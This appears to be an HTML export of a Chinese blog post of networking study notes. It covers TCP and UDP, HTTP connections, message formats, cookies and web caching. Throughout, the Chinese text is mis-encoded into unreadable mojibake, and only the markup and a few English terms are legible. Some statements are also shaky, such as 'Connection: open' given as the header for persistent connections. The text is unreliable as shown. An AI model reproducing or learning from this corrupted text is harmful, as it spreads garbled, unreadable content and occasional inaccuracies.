<h4 id="TCPæœåŠ¡"><a href="#TCPæœåŠ¡" class="headerlink" title="TCPæœåŠ¡"></a>TCPæœåŠ¡</h4><p>TCPæœåŠ¡çš„æ¨¡å‹åŒ…æ‹¬ï¼š==é¢å‘è¿æ¥æœåŠ¡å’Œå¯é æ•°æ®ä¼ è¾“æœåŠ¡==</p>
<p>æœ‰æ‹¥å¡æ§åˆ¶æœºåˆ¶</p>
<h4 id="UDPæœåŠ¡"><a href="#UDPæœåŠ¡" class="headerlink" title="UDPæœåŠ¡"></a>UDPæœåŠ¡</h4><p>UDPä»…æä¾›æœ€å°çš„æœåŠ¡ï¼Œæ˜¯æ— è¿æ¥çš„ï¼Œå› æ­¤åœ¨è¿›è¡Œè¿æ¥çš„æ—¶å€™æ²¡æœ‰æ¡æ‰‹è¿‡ç¨‹ï¼Œä¸”å¹¶ä¸èƒ½ä¿è¯æŠ¥æ–‡èƒ½åˆ°è¾¾æ¥æ”¶è¿›ç¨‹ï¼Œåˆ°äº†ä¹Ÿæœ‰å¯èƒ½æ˜¯ä¹±åºçš„</p>
<p>æ²¡æœ‰æ‹¥å¡æ§åˆ¶æœºåˆ¶ï¼ˆä¸è¿‡æœ‰çš„æ—¶å€™ï¼Œå®é™…çš„ç«¯åˆ°ç«¯ååé‡å¯èƒ½å°äºé€‰å®šçš„ä»»æ„é€Ÿç‡ï¼Œå› ä¸ºä¸­é—´é“¾è·¯çš„å¸¦å®½å¯èƒ½ä¼šå—é™æˆ–è€…æ‹¥å¡å¯¼è‡´çš„ï¼‰</p>
<h4 id="å› ç‰¹ç½‘ä¸æä¾›çš„æœåŠ¡"><a href="#å› ç‰¹ç½‘ä¸æä¾›çš„æœåŠ¡" class="headerlink" title="å› ç‰¹ç½‘ä¸æä¾›çš„æœåŠ¡"></a>å› ç‰¹ç½‘ä¸æä¾›çš„æœåŠ¡</h4><p>è¿è¾“å±‚åè®®ä¸æä¾›ååé‡å’Œå®šæ—¶ä¿è¯çš„æœåŠ¡</p>
<p>ä¸‹å›¾æ˜¯å› ç‰¹ç½‘åº”ç”¨æ‰€ä½¿ç”¨çš„åè®®</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240403191549255.png" class="" title="image-20240403191549255">

<h3 id="åº”ç”¨å±‚åè®®"><a href="#åº”ç”¨å±‚åè®®" class="headerlink" title="åº”ç”¨å±‚åè®®"></a>åº”ç”¨å±‚åè®®</h3><p>å®šä¹‰äº†è¿è¡Œåœ¨ä¸åŒç«¯ç³»ç»Ÿä¸Šçš„åº”ç”¨ç¨‹åºè¿›ç¨‹å¦‚ä½•ç›¸äº’ä¼ é€’æŠ¥æ–‡ã€‚</p>
<ol>
<li>äº¤æ¢çš„æŠ¥æ–‡ç±»å‹ï¼Œä¾‹å¦‚è¯·æ±‚æŠ¥æ–‡ï¼Œå“åº”æŠ¥æ–‡</li>
<li>å„ç§ç±»å‹æŠ¥æ–‡çš„è¯­æ³•ï¼Œä¾‹å¦‚æŠ¥æ–‡ä¸­çš„å­—æ®µå’Œå­—æ®µçš„æè¿°</li>
<li>å­—æ®µçš„è¯­ä¹‰ï¼Œå³è¿™äº›å­—æ®µçš„ä¿¡æ¯çš„å«ä¹‰</li>
<li>ç¡®å®šä¸€ä¸ªè¿›ç¨‹ä»€ä¹ˆæ—¶å€™ï¼Œæ€ä¹ˆå‘é€æŠ¥æ–‡ï¼Œå¯¹æŠ¥æ–‡å“åº”çš„è§„åˆ™</li>
</ol>
<h3 id="è¿™ä¸€ç« æ¶‰åŠåˆ°çš„ç½‘ç»œåº”ç”¨"><a href="#è¿™ä¸€ç« æ¶‰åŠåˆ°çš„ç½‘ç»œåº”ç”¨" class="headerlink" title="è¿™ä¸€ç« æ¶‰åŠåˆ°çš„ç½‘ç»œåº”ç”¨"></a>è¿™ä¸€ç« æ¶‰åŠåˆ°çš„ç½‘ç»œåº”ç”¨</h3><p>Webã€æ–‡ä»¶ä¼ è¾“ã€ç”µå­é‚®ä»¶ã€ç›®å½•æœåŠ¡ã€æµå¼è§†é¢‘å’ŒP2P</p>
<h2 id="Webå’ŒHTTP"><a href="#Webå’ŒHTTP" class="headerlink" title="Webå’ŒHTTP"></a>Webå’ŒHTTP</h2><h3 id="HTTPæ¦‚å†µ"><a href="#HTTPæ¦‚å†µ" class="headerlink" title="HTTPæ¦‚å†µ"></a>HTTPæ¦‚å†µ</h3><p>==è¶…æ–‡æœ¬è¿è¾“åè®®ï¼ˆHyperText Transfer Protocol, HTTPï¼‰==ç”±å®¢æˆ·ç¨‹åºå’ŒæœåŠ¡å™¨ç¨‹åºå®ç°ï¼Œå®ƒä»¬é€šè¿‡äº¤æ¢HTTPæŠ¥æ–‡è¿›è¡Œä¼šè¯ã€‚åŒæ—¶ï¼ŒHTTPå®šä¹‰äº†==è¿™äº›æŠ¥æ–‡çš„ç»“æ„ä»¥åŠå®¢æˆ·å’ŒæœåŠ¡å™¨è¿›è¡ŒæŠ¥æ–‡äº¤æ¢çš„æ–¹å¼==ã€‚</p>
<p>==Webé¡µé¢ï¼ˆWeb pageï¼Œä¹Ÿå«æ–‡æ¡£ï¼‰ç”±å¯¹è±¡ç»„æˆ==ï¼Œè€Œå¯¹è±¡åªæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚HTMLæ–‡ä»¶ï¼ŒJPEGå›¾å½¢ç­‰ç­‰ã€‚å…¶ä¸­ï¼Œå¤§å¤šæ•°Webé¡µé¢éƒ½ä¼šå«æœ‰ä¸€ä¸ªHTMLæ–‡ä»¶å’Œå‡ ä¸ªå¼•ç”¨å¯¹è±¡ï¼Œå…¶å¯¹è±¡æ•°é‡å°±æ˜¯å¼•ç”¨å¯¹è±¡çš„æ•°é‡åŠ ä¸ŠHTMLæ–‡ä»¶æ•°ï¼ˆè¯´ç™½äº†å°±æ˜¯N+1ä¸ªå¯¹è±¡ï¼‰</p>
<p>==WebæœåŠ¡å™¨==å®ç°äº†HTTPçš„å®¢æˆ·ç«¯ï¼ˆæ‰€ä»¥åœ¨Webç¯å¢ƒä¸­ç»å¸¸ä¼šäº¤æ›¿ä½¿ç”¨â€æµè§ˆå™¨â€œå’Œâ€å®¢æˆ·â€œä¸¤ç§æœ¯è¯­ï¼‰ï¼Œä¹Ÿå®ç°äº†HTTPçš„æœåŠ¡å™¨ç«¯ï¼ˆç”¨äºå­˜å‚¨Webå¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡ç”±URLå¯»å€ï¼‰</p>
<p>:::info</p>
<p>HTMLåŸºæœ¬æ–‡ä»¶æ˜¯é€šè¿‡å¯¹è±¡çš„URLåœ°å€æ¥å¼•ç”¨é¡µé¢çš„å…¶ä»–å¯¹è±¡ï¼Œå½¢å¦‚<code>http://www.example.com/path/to/sth</code>éƒ½æ˜¯URLåœ°å€ï¼Œå…¶ä¸­<code>www.example.com</code>æ˜¯ä¸»æœºåï¼Œè€Œ<code>/path/to/sth</code>æ˜¯è·¯å¾„å</p>
<p>:::</p>
<p>HTTPå®šä¹‰äº†Webå®¢æˆ·å‘WebæœåŠ¡å™¨è¯·æ±‚Webé¡µé¢çš„æ–¹å¼ï¼Œä»¥åŠæœåŠ¡å™¨å‘å®¢æˆ·ä¼ é€Webé¡µé¢çš„æ–¹å¼ï¼ŒåŸºæœ¬æ€æƒ³å¦‚ä¸‹å›¾ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408195027295.png" class="" title="image-20240408195027295">

<ol>
<li>ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªWebé¡µé¢ï¼›</li>
<li>æµè§ˆå™¨å‘æœåŠ¡å™¨å‘å‡ºè¯¥é¡µé¢ä¸­æ‰€åŒ…å«å¯¹è±¡çš„HTTPè¯·æ±‚æŠ¥æ–‡ï¼›</li>
<li>æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚å¹¶ç”¨åŒ…å«è¿™äº›å¯¹è±¡çš„HTTPå“åº”æŠ¥æ–‡è¿›è¡Œç›¸åº”</li>
</ol>
<h4 id="æ— çŠ¶æ€åè®®"><a href="#æ— çŠ¶æ€åè®®" class="headerlink" title="æ— çŠ¶æ€åè®®"></a>æ— çŠ¶æ€åè®®</h4><p>HTTPæœåŠ¡å™¨ä¸ä¿å­˜å…³äºç”¨æˆ·çš„ä»»ä½•ä¿¡æ¯ï¼Œè¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå…³äºHTTPçš„ç°è±¡ï¼š==æœåŠ¡å™¨å‘å®¢æˆ·å‘é€è¢«è¯·æ±‚çš„æ–‡ä»¶ï¼Œä½†æ˜¯ä¸å­˜å‚¨ä»»ä½•å…³äºç”¨æˆ·çš„çŠ¶æ€ä¿¡æ¯==ã€‚</p>
<p>:::info</p>
<p>Webä½¿ç”¨çš„æ˜¯å®¢æˆ·-æœåŠ¡å™¨åº”ç”¨ç¨‹åºä½“ç³»æ¶æ„ï¼Œå…¶å®çœ‹äº†å›¾ç¤ºä¹Ÿå·®ä¸å¤šå¯ä»¥æƒ³åˆ°äº†</p>
<p>:::</p>
<h3 id="éæŒç»­é“¾æ¥å’ŒæŒç»­é“¾æ¥"><a href="#éæŒç»­é“¾æ¥å’ŒæŒç»­é“¾æ¥" class="headerlink" title="éæŒç»­é“¾æ¥å’ŒæŒç»­é“¾æ¥"></a>éæŒç»­é“¾æ¥å’ŒæŒç»­é“¾æ¥</h3><h4 id="éæŒç»­è¿æ¥ï¼ˆnon-persistent-connectionï¼‰"><a href="#éæŒç»­è¿æ¥ï¼ˆnon-persistent-connectionï¼‰" class="headerlink" title="éæŒç»­è¿æ¥ï¼ˆnon-persistent connectionï¼‰"></a>éæŒç»­è¿æ¥ï¼ˆnon-persistent connectionï¼‰</h4><p>==æ¯ä¸€ä¸ªè¯·æ±‚/å“åº”å¯¹ç»è¿‡ä¸€ä¸ªå•ç‹¬çš„TCPè¿æ¥å‘é€==ã€‚</p>
<p>å‡è®¾URLä¸º<code>http://www.example.com/path/to/sth</code>ï¼Œä¸”å…¶ä¸­åŒ…å«ä¸€ä¸ªHTMLæ–‡ä»¶å’ŒNä¸ªJPEGå›¾å½¢æ–‡ä»¶ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æœåŠ¡ç«¯å‘å®¢æˆ·ä¼ é€ä¸€ä¸ªWebé¡µé¢çš„æ­¥éª¤ï¼š</p>
<ol>
<li>HTTPå®¢æˆ·è¿›ç¨‹åœ¨é»˜è®¤ç«¯å£å·80å‘èµ·ä¸€ä¸ªåˆ°æœåŠ¡å™¨<code>http://www.example.com</code>çš„TCPè¿æ¥ï¼Œåœ¨å®¢æˆ·ä¸æœåŠ¡å™¨ä¸Šåˆ†åˆ«æœ‰ä¸€ä¸ªå¥—æ¥å­—ä¸è¯¥è¿æ¥ç›¸å…³è”ï¼›</li>
<li>HTTPå®¢æˆ·ç»è¿‡è‡ªå·±çš„å¥—æ¥å­—å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªHTTPè¯·æ±‚æŠ¥æ–‡ï¼Œè¯·æ±‚æŠ¥æ–‡ä¸­åŒ…å«äº†è·¯å¾„å<code>/path/to/sth</code>ï¼›</li>
<li>HTTPæœåŠ¡å™¨è¿›ç¨‹ç»è¿‡è‡ªå·±çš„å¥—æ¥å­—æ¥æ”¶è¯¥è¯·æ±‚æŠ¥æ–‡ï¼Œä»è‡ªå·±çš„å­˜å‚¨å™¨ä¸­æ£€ç´¢å¯¹è±¡<code>http://www.example.com/path/to/sth</code>ï¼Œå¹¶å°†å…¶å°è£…åˆ°ä¸€ä¸ªHTTPå“åº”æŠ¥æ–‡ä¸­ï¼›</li>
<li>HTTPæœåŠ¡å™¨è¿›ç¨‹é€šçŸ¥TCPæ–­å¼€TCPè¿æ¥ã€‚ï¼ˆå½“ç„¶äº†ï¼Œè¦ç­‰TCPç¡®è®¤å®¢æˆ·å·²ç»æ”¶åˆ°å®Œæ•´çš„å“åº”æŠ¥æ–‡åï¼Œå®ƒæ‰ä¼šæ–­å¼€è¿æ¥ï¼‰ï¼›</li>
<li>HTTPå®¢æˆ·æ¥æ”¶å“åº”æŠ¥æ–‡ï¼ŒTCPè¿æ¥å…³é—­ã€‚æŠ¥æ–‡æŒ‡å‡ºå°è£…å¯¹è±¡æ˜¯ä¸€ä¸ªHTMLæ–‡ä»¶ï¼Œå®¢æˆ·ä»æŠ¥æ–‡æå–è¯¥æ–‡ä»¶ï¼Œæ£€æŸ¥HTMLæ–‡ä»¶åå¾—åˆ°Nä¸ªJPEGå›¾å½¢æ–‡ä»¶ï¼›</li>
<li>å¯¹æ¯ä¸€ä¸ªå¼•ç”¨çš„JPEGå›¾å½¢å¯¹è±¡é‡å¤å‰4ä¸ªæ­¥éª¤ã€‚</li>
</ol>
<p>ç»è¿‡ä¸Šè¿°æ­¥éª¤ï¼Œç”¨æˆ·åœ¨è¯·æ±‚è¯¥Webé¡µé¢æ—¶ï¼Œéœ€è¦äº§ç”ŸN+1ä¸ªTCPè¿æ¥</p>
<p>:::info ä¼°ç®—ä»è¯·æ±‚åˆ°å®Œå…¨æ¥æ”¶çš„æ—¶é—´</p>
<p><strong>å¾€è¿”æ—¶é—´ï¼ˆRTTï¼ŒRound-Trip Timeï¼‰</strong>ï¼šæŒ‡ä¸€ä¸ªçŸ­åˆ†ç»„ä»å®¢æˆ·åˆ°æœåŠ¡å™¨ç„¶åå†è¿”å›å®¢æˆ·æ‰€èŠ±è´¹çš„æ—¶é—´</p>
<p>RTTåŒ…æ‹¬åˆ†ç»„ä¼ æ’­æ—¶å»¶ã€åˆ†ç»„åœ¨ä¸­é—´è·¯ç”±å™¨å’Œäº¤æ¢æœºä¸Šçš„æ’é˜Ÿæ—¶å»¶å’Œåˆ†ç»„å¤„ç†æ—¶å»¶ã€‚</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408202857646.png" class="" title="image-20240408202857646">

<p>ï¼ˆæ¶‰åŠåˆ°ä¸‰æ¬¡æ¡æ‰‹ï¼Œè¿™ä¸ªåé¢å†è¯´ï¼‰</p>
<ol>
<li>å®¢æˆ·è¯·æ±‚Webé¡µé¢æ—¶ï¼Œä¼šå…ˆè¯·æ±‚å»ºç«‹ä¸€ä¸ªTCPè¿æ¥ã€‚å®¢æˆ·å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªTCPæŠ¥æ–‡æ®µï¼ŒæœåŠ¡å™¨å†å‘å®¢æˆ·å‘é€ä¸€ä¸ªTCPæŠ¥æ–‡æ®µæ¥ä½œå‡ºè¯·æ±‚ä¸å›åº”ï¼›ï¼ˆå ç”¨ä¸€ä¸ªRTTï¼‰</li>
<li>å®¢æˆ·å‘é€ä¸€ä¸ªHTTPè¯·æ±‚æŠ¥æ–‡ï¼ŒæŠ¥æ–‡åˆ°è¾¾æœåŠ¡å™¨åï¼ŒæœåŠ¡å™¨å°±ä¼šå‘é€å“åº”æŠ¥æ–‡ï¼ˆå ç”¨ä¸€ä¸ªRTTï¼‰</li>
<li>åé¢ä¼ è¾“æ–‡ä»¶çš„äº‹æƒ…å°±å¦ç®—äº†</li>
</ol>
<p>å› æ­¤æ€»çš„æ—¶é—´æ˜¯<code>2RTT + ä¼ è¾“æ–‡ä»¶çš„æ—¶é—´</code></p>
<p>:::</p>
<h4 id="æŒç»­è¿æ¥ï¼ˆpersistent-connectionï¼‰"><a href="#æŒç»­è¿æ¥ï¼ˆpersistent-connectionï¼‰" class="headerlink" title="æŒç»­è¿æ¥ï¼ˆpersistent connectionï¼‰"></a>æŒç»­è¿æ¥ï¼ˆpersistent connectionï¼‰</h4><p>==æ‰€æœ‰çš„è¯·æ±‚/å“åº”å¯¹ç»è¿‡ç›¸åŒçš„TCPè¿æ¥å‘é€==ã€‚</p>
<p>ç›¸å¯¹åœ°ï¼Œåœ¨è¿™ä¸ªæ–¹å¼ä¸‹ï¼ŒæœåŠ¡å™¨åœ¨å‘é€å“åº”åå¹¶ä¸ä¼šé€šçŸ¥TCPå…³é—­è¿æ¥ï¼Œè€Œæ˜¯ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œå› æ­¤åç»­çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡èƒ½é€šè¿‡ç›¸åŒçš„è¿æ¥è¿›è¡Œä¼ é€ã€‚</p>
<p>è¯´ç™½äº†ï¼ŒæŒ‰ç…§ä¸Šä¸€ä¸ªè¿æ¥çš„ä¾‹å­ï¼Œéœ€è¦ç”¨åˆ°çš„TCPè¿æ¥æ•°å°±ä¼šä»N+1ä¸ªå˜æˆ1ä¸ª</p>
<p>:::warning no-icon</p>
<p>éæŒç»­è¿æ¥çš„ç¼ºç‚¹ï¼š</p>
<ol>
<li>è¯¥æ–¹å¼ä¸‹ï¼Œä¸¤ç«¯éœ€è¦ä¸ºæ¯ä¸€ä¸ªè¯·æ±‚çš„å¯¹è±¡å»ºç«‹å’Œç»´æŠ¤ä¸€ä¸ªå…¨æ–°çš„è¿æ¥ï¼›</li>
<li>æ—¶é—´å ç”¨å¤ªå¤šï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éœ€è¦èŠ±è´¹ä¸¤å€RTTæ¥åˆ›å»ºTCPè¿æ¥å’Œè¯·æ±‚æ¥æ”¶ã€‚</li>
</ol>
<p>:::</p>
<h3 id="HTTPæŠ¥æ–‡æ ¼å¼"><a href="#HTTPæŠ¥æ–‡æ ¼å¼" class="headerlink" title="HTTPæŠ¥æ–‡æ ¼å¼"></a>HTTPæŠ¥æ–‡æ ¼å¼</h3><h4 id="è¯·æ±‚æŠ¥æ–‡"><a href="#è¯·æ±‚æŠ¥æ–‡" class="headerlink" title="è¯·æ±‚æŠ¥æ–‡"></a>è¯·æ±‚æŠ¥æ–‡</h4><p>æ‹¿ä¹¦ä¸Šçš„ä¾‹å­è¯´è¯´ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408204922748.png" class="" title="image-20240408204922748">

<p>ç¬¬ä¸€è¡Œä¸º<strong>è¯·æ±‚è¡Œï¼ˆrequest lineï¼‰</strong>ï¼Œåé¢çš„å…¨éƒ¨ä¸º<strong>é¦–éƒ¨è¡Œï¼ˆheader lineï¼‰</strong>ã€‚</p>
<p>ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œè¯·æ±‚è¡Œæœ‰ä¸‰ä¸ªéƒ¨åˆ†ï¼šæ–¹æ³•å­—æ®µã€URLå­—æ®µå’ŒHTTPç‰ˆæœ¬å­—æ®µã€‚å…¶ä¸­ï¼Œè¯·æ±‚æ–¹æ³•æœ‰å¾ˆå¤šï¼š==GETã€POSTã€DELETEã€PUTã€HEAD==ã€‚</p>
<p>å†æ¥çœ‹çœ‹é¦–éƒ¨è¡Œï¼š</p>
<ol>
<li>Hostï¼šæŒ‡æ˜å¯¹è±¡æ‰€åœ¨çš„ä¸»æœºï¼›</li>
<li>Connectionï¼šcloseä»£è¡¨éæŒç»­è¿æ¥ï¼Œopenä»£è¡¨æŒç»­è¿æ¥ï¼ˆæˆ‘è®°å¾—æ˜¯openå§ï¼‰ï¼›</li>
<li>User-Agentï¼šæŒ‡æ˜ç”¨æˆ·ä»£ç†ï¼Œä¹Ÿç›¸å½“äºæŒ‡æ˜å‘é€è¯·æ±‚çš„æµè§ˆå™¨çš„ç±»å‹ï¼›</li>
<li>Accept-languageï¼šè¡¨ç¤ºç”¨æˆ·æƒ³å¾—åˆ°è¯¥å¯¹è±¡çš„è¯­è¨€ç‰ˆæœ¬ï¼ŒæœåŠ¡å™¨ä¸å­˜åœ¨è¿™æ ·çš„å¯¹è±¡å°±å‘é€é»˜è®¤è¯­è¨€ç‰ˆæœ¬</li>
</ol>
<p>ä¸‹å›¾æ˜¯è¯·æ±‚æŠ¥æ–‡çš„é€šç”¨æ ¼å¼ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408205838564.png" class="" title="image-20240408205838564">

<h4 id="å“åº”æŠ¥æ–‡"><a href="#å“åº”æŠ¥æ–‡" class="headerlink" title="å“åº”æŠ¥æ–‡"></a>å“åº”æŠ¥æ–‡</h4><p>æ¥ç€æ‹¿ä¹¦ä¸Šçš„ä¾‹å­</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408205945431.png" class="" title="image-20240408205945431">

<p>å“åº”æŠ¥æ–‡æœ‰ä¸‰ä¸ªéƒ¨åˆ†ï¼šä¸€ä¸ªåˆå§‹çŠ¶æ€è¡Œï¼ˆstatus lineï¼‰ï¼Œè‹¥å¹²ä¸ªé¦–éƒ¨è¡Œï¼ˆheader lineï¼‰ï¼Œå®ä½“ä½“ï¼ˆentity bodyï¼‰</p>
<p>çŠ¶æ€è¡ŒåŒ…å«ä¸‰ä¸ªä¿¡æ¯ï¼šåè®®ç‰ˆæœ¬å­—æ®µï¼ŒçŠ¶æ€ç ï¼ŒçŠ¶æ€ä¿¡æ¯</p>
<p>é¦–éƒ¨è¡Œï¼š</p>
<ol>
<li>Connectionï¼šä¸èµ˜è¿°ï¼›</li>
<li>Dateï¼šæœåŠ¡å™¨äº§ç”Ÿå¹¶å‘é€æŠ¥æ–‡çš„æ—¶é—´ï¼›</li>
<li>Serverï¼šè¡¨ç¤ºæŠ¥æ–‡æ˜¯ç”±æŸä¸ªæœåŠ¡å™¨äº§ç”Ÿçš„ï¼›</li>
<li>Last-Modifiedï¼šå¯¹è±¡åˆ›å»ºæˆ–è€…æœ€åä¿®æ”¹çš„æ—¥æœŸå’Œæ—¶é—´ï¼ˆè¿™ä¸ªåé¢å†è¯´ï¼‰ï¼›</li>
<li>Content-Lengthï¼šè¢«å‘é€å¯¹è±¡ä¸­çš„å­—èŠ‚æ•°ï¼ˆåº”è¯¥æ˜¯æŒ‡å®ä½“ä½“ï¼‰ï¼›</li>
<li>Content-Typeï¼šæŒ‡ç¤ºå®ä½“ä½“ä¸­çš„å¯¹è±¡æ˜¯ä»€ä¹ˆç±»å‹çš„æ–‡æœ¬</li>
</ol>
<p>å®ä½“ä½“åŒ…å«äº†è¯·æ±‚çš„å¯¹è±¡æœ¬èº«ï¼ˆdata data dataâ€¦â€¦ï¼‰</p>
<p>çŠ¶æ€ç æœ‰ç‚¹ä¸æƒ³è¯´ï¼Œæˆ‘ç›´æ¥æŠŠå®˜æ–¹çš„æ–‡æ¡£æ”¾è¿™äº† -&gt; <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">click me</a></p>
<h3 id="ç”¨æˆ·ä¸æœåŠ¡å™¨çš„äº¤äº’ï¼šcookie"><a href="#ç”¨æˆ·ä¸æœåŠ¡å™¨çš„äº¤äº’ï¼šcookie" class="headerlink" title="ç”¨æˆ·ä¸æœåŠ¡å™¨çš„äº¤äº’ï¼šcookie"></a>ç”¨æˆ·ä¸æœåŠ¡å™¨çš„äº¤äº’ï¼šcookie</h3><p>cookie==å…è®¸ç«™ç‚¹å¯¹ç”¨æˆ·è¿›è¡Œè¿½è¸ª==ã€‚</p>
<p>è‡³äºæœ‰ä»€ä¹ˆç”¨ï¼Œä¸¾ä¸ªä¾‹å­ï¼šæˆ‘è®¿é—®<code>github.com</code>ï¼Œä½†æˆ‘æƒ³è®¿é—®ä¹‹åç›´æ¥åˆ°ä¸æˆ‘æœ‰å…³çš„ç•Œé¢ï¼Œè¿™æ ·å°±å¯ä»¥çœå»ç™»å½•æ­¥éª¤ï¼Œè¿™ä¸ªæ—¶å€™cookieå°±å‘æŒ¥äº†ä½œç”¨ï¼Œå®ƒä¼šä¿æŒæˆ‘åœ¨è¿™ä¸ªç½‘ç«™çš„ç™»å½•çŠ¶æ€ï¼Œä»¥é˜²ä¸€äº›ä¸å¿…è¦çš„ç™»å½•ã€‚</p>
<p>ä¸è¿‡å‘¢ï¼Œä¸åŒçš„æµè§ˆå™¨cookieè‚¯å®šæ˜¯ä¸åŒçš„ï¼Œä¾‹å¦‚ç«ç‹ç™»å½•äº†csdnï¼Œä¹‹åå°±å¯ä»¥çœå»ç™»å½•æ­¥éª¤ï¼›IEæ²¡æœ‰ç™»é™†è¿‡ï¼Œå¿…é¡»è¦ç™»å½•</p>
<p>å½“ç„¶ï¼Œå’±ä¹‹å‰ç©çš„å°æ¸¸æˆæœ‰éœ€è¦å­˜æ¡£çš„ï¼Œä¹Ÿç”¨åˆ°äº†cookie</p>
<p>ä¸‹å›¾è¡¨ç¤ºcookieè·Ÿè¸ªç”¨æˆ·çš„çŠ¶æ€</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240408211022491.png" class="" title="image-20240408211022491">

<p>æ ¹æ®ä¸Šå›¾å¯ä»¥å¾—çŸ¥ï¼ŒcookieæŠ€æœ¯æœ‰å››ä¸ªç»„ä»¶ï¼š</p>
<ol>
<li>HTTPå“åº”æŠ¥æ–‡çš„ä¸€ä¸ªcookieé¦–éƒ¨è¡Œï¼›</li>
<li>HTTPè¯·æ±‚æŠ¥æ–‡çš„ä¸€ä¸ªcookieé¦–éƒ¨è¡Œï¼›</li>
<li>ç”¨æˆ·ç«¯ç³»ç»Ÿä¸­ä¿ç•™æœ‰ä¸€ä¸ªcookieæ–‡ä»¶ï¼Œç”±ç”¨æˆ·çš„æµè§ˆå™¨ç®¡ç†ï¼›</li>
<li>Webç«™ç‚¹çš„ä¸€ä¸ªåç«¯æ•°æ®åº“</li>
</ol>
<p>:::info</p>
<p>cookieå¯ä»¥æ ‡è¯†ä¸€ä¸ªç”¨æˆ·ã€‚ç”¨æˆ·é¦–æ¬¡è®¿é—®æŸä¸ªç«™ç‚¹æ—¶å¯èƒ½éœ€è¦æä¾›ä¸€ä¸ªç”¨æˆ·æ ‡è¯†ï¼ˆä¾‹å¦‚åå­—ï¼‰ï¼Œåœ¨åé¢çš„å¯¹è¯ä¸­ï¼Œæµè§ˆå™¨ä¼šå‘æœåŠ¡å™¨ä¼ é€’ä¸€ä¸ªcookieé¦–éƒ¨ï¼Œä»è€Œå‘æœåŠ¡å™¨æ ‡è¯†äº†è¿™ä¸ªç”¨æˆ·ã€‚</p>
<p>å› æ­¤ï¼Œcookieå¯ä»¥åœ¨æ— çŠ¶æ€HTTPä¹‹ä¸Šå»ºç«‹ä¸€ä¸ªä¼šè¯å±‚ã€‚</p>
<p>:::</p>
<h3 id="Webç¼“å­˜"><a href="#Webç¼“å­˜" class="headerlink" title="Webç¼“å­˜"></a>Webç¼“å­˜</h3><p><strong>Webç¼“å­˜å™¨ï¼ˆWeb cacheï¼‰</strong>ä¹Ÿå«<strong>ä»£ç†æœåŠ¡å™¨ï¼ˆproxy serverï¼‰</strong>ï¼Œå®ƒæ˜¯èƒ½å¤Ÿä»£è¡¨åˆå§‹WebæœåŠ¡å™¨æ¥æ»¡è¶³HTTPè¯·æ±‚çš„ç½‘ç»œç©ºé—´å®ä½“ã€‚</p>
<p>å…¶ä¸­ï¼ŒWebç¼“å­˜å™¨æœ‰è‡ªå·±çš„ç£ç›˜å­˜å‚¨ç©ºé—´ï¼Œå¹¶åœ¨å­˜å‚¨ç©ºé—´ä¸­ä¿å­˜æœ€è¿‘è¯·æ±‚è¿‡çš„å¯¹è±¡çš„å‰¯æœ¬ã€‚</p>
<p>è¿˜æ˜¯æ‹¿ä¹¦ä¸Šçš„ä¾‹å­ï¼Œçœ‹ä¸‹å›¾ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409084203339.png" class="" title="image-20240409084203339">

<p>ç°åœ¨å®¢æˆ·é…ç½®çš„æµè§ˆå™¨éƒ½å¯ä»¥ä½¿ä»–ä»¬çš„HTTPè¯·æ±‚é¦–å…ˆæŒ‡å‘Webç¼“å­˜å™¨ï¼Œä»¥<code>http://www.example.com/path/to/sth</code>ä¸ºä¾‹ï¼Œç°åœ¨æµè§ˆå™¨æ­£åœ¨è¯·æ±‚è¯¥å¯¹è±¡ï¼Œæ¥çœ‹çœ‹éƒ½å‘ç”Ÿäº†ä»€ä¹ˆï¼š</p>
<ol>
<li>æµè§ˆå™¨åˆ›å»ºäº†ä¸€ä¸ªåˆ°Webç¼“å­˜å™¨çš„TCPè¿æ¥ï¼Œå¹¶å‘Webç¼“å­˜å™¨ä¸­çš„å¯¹è±¡å‘é€ä¸€ä¸ªHTTPè¯·æ±‚ï¼›</li>
<li>Webç¼“å­˜å™¨æ¥æ”¶è¯·æ±‚ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦å­˜åœ¨è¯¥å¯¹è±¡çš„å‰¯æœ¬ã€‚å¦‚æœæœ‰ï¼ŒWebç¼“å­˜å™¨å°±è¿”å›åŒ…å«è¯¥å¯¹è±¡çš„HTTPå“åº”æŠ¥æ–‡ï¼Œæ²¡æœ‰å°±è¿›è¡Œä¸‹ä¸€æ­¥ï¼›</li>
<li>Webç¼“å­˜å™¨æ‰“å¼€ä¸€ä¸ªä¸è¯¥å¯¹è±¡çš„åˆå§‹æœåŠ¡å™¨ï¼ˆ<code>www.example.com</code>ï¼‰çš„TCPè¿æ¥ï¼Œç„¶ååœ¨è¿™ä¸ªè¿æ¥ä¸Šå‘é€ä¸€ä¸ªå…³äºè¯¥å¯¹è±¡çš„HTTPè¯·æ±‚ã€‚æ”¶åˆ°è¯·æ±‚åï¼Œåˆå§‹æœåŠ¡å™¨å‘Webç¼“å­˜å™¨å‘é€åŒ…å«è¯¥å¯¹è±¡çš„HTTPå“åº”ï¼›</li>
